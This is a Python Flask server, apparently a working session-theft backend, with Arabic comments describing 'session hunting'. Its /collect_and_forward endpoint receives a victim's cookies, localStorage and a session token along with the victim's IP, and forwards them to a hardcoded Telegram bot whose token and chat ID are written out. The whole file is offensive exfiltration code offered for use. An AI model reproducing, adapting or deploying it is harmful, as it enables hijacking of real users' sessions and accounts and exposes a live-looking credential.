# app.py - النسخة النهائية المصححة لخطأ SyntaxError
from flask import Flask, request, jsonify, render_template
import requests
import os
import base64
import sys

app = Flask(__name__)

#================================================
# اعدادات التلغرام (معرف الدردشة تم تأكيده: 6521966233)
#================================================
TELEGRAM_BOT_TOKEN = "8524364904:AAEB_SX7vIt2EhZikJbLOBgwHOmeQTYuHN8"
TELEGRAM_CHAT_ID = "6521966233" 
#================================================

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except requests.exceptions.RequestException:
        pass 

@app.route('/collect_and_forward', methods=['POST'])
def collect_data():
    try:
        data = request.json
        if not data:
            data = request.get_json(force=True)
            
        ip_address = request.remote_addr
        
        # استخراج الحقول القديمة
        cookies = data.get('cookies', 'N/A')
        local_storage = data.get('localStorage', 'N/A')
        # استخراج الحقل الجديد والحاسم!
        cto_bundle_token = data.get('CTO_BUNDLE_TOKEN', 'لم يتم العثور عليه (N/A)')
        url = data.get('url', 'N/A')

        telegram_message = f"""
*🚨 اصطياد جلسة موبي (المرحلة النهائية)! 😈*

*الرابط كامل:* `{url}`
*عنوان IP الضحية:* `{ip_address}`

---
*🔥 الرمز الحاسم (CTO_BUNDLE TOKEN):*
`{cto_bundle_token}`
---
*الكوكيز المتاحة لـ JS:*
*التخزين المحلي (LocalStorage):*
        """ # <--- تم التأكد من الإغلاق هنا بشكل صحيح
        send_telegram_message(telegram_message)
        
        return jsonify({"status": "success"}), 200

    except Exception:
        return jsonify({"status": "internal_error"}), 500

@app.route('/')
def home():
    return render_template('index.html')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
